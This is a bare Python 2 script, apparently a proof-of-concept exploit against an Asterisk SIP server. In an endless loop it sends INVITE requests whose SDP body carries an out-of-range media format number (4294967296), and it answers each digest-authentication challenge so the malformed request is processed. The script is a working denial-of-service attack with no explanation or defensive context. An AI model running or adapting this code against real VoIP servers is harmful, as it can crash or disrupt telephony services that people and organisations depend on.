import socket
import re
import md5
import uuid

SERVER_IP = "127.0.0.1"
SERVER_PORT = 5060
UDP_IP = "0.0.0.0"
UDP_PORT = 13940
USERNAME = "5678"
PASSWORD = "5678"
INVITE_USERNAME = "5678"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((UDP_IP, UDP_PORT))

while True:
    callid = str(uuid.uuid4())

    fmt = 4294967296

    sdpbody = "v=0\r\n" \
        "o=- 1061502179 1061502179 IN IP4 172.17.0.1\r\n" \
        "s=Asterisk\r\n" \
        "c=IN IP4 172.17.0.2\r\n" \
        "m=audio 17002 RTP/AVP %s" % fmt

    msg="INVITE sip:%s@%s:%i SIP/2.0\r\n" \
        "To: <sip:%s@%s:%i>\r\n" \
        "From: Test <sip:%s@%s:%s>\r\n" \
        "Call-ID: %s\r\n" \
        "CSeq: 2 INVITE\r\n" \
        "Via: SIP/2.0/UDP 172.17.0.1:10394;branch=z9hG4bK%s\r\n" \
        "Contact: <sip:%s@172.17.0.1>\r\n" \
        "Content-Type: application/sdp\r\n" \
        "{{AUTH}}" \
        "Content-Length: %i\r\n" \
        "\r\n" % (
            INVITE_USERNAME, SERVER_IP, SERVER_PORT,
            INVITE_USERNAME, SERVER_IP, SERVER_PORT,
            USERNAME, SERVER_IP, SERVER_PORT,
            callid, callid,
            USERNAME, len(sdpbody)
            ) + \
        sdpbody

    sock.sendto(msg.replace("{{AUTH}}", ""), (SERVER_IP, SERVER_PORT))

    data, addr = sock.recvfrom(10240)

    if data.startswith("SIP/2.0 401"):
        for line in data.split('\r\n'):
            if line.startswith("WWW-Authenticate"):
                content = line.split(':', 2)[1].strip()
                realm = re.search("realm=\"([a-z]+)\"", content).group(1)
                nonce = re.search("nonce=\"([a-z0-9\/]+)\"", content).group(1)
                ha1 = md5.new(USERNAME + ":" + realm + ":" + PASSWORD).hexdigest()
                uri = "sip:%s:%i" % (SERVER_IP, SERVER_PORT)
                ha2 = md5.new("INVITE:" + uri).hexdigest()
                r = md5.new(ha1 + ":" + nonce + ":" + ha2).hexdigest()

                auth = "Authorization: Digest username=\"%s\"," % (USERNAME) + \
                    "realm=\"%s\"," % (realm) + \
                    "nonce=\"%s\"," % (nonce) + \
                    "uri=\"%s\"," % (uri) + \
                    "response=\"%s\"," % (r) + \
                    "algorithm=md5\r\n"

    sock.sendto(msg.replace("{{AUTH}}", auth), (SERVER_IP, SERVER_PORT))
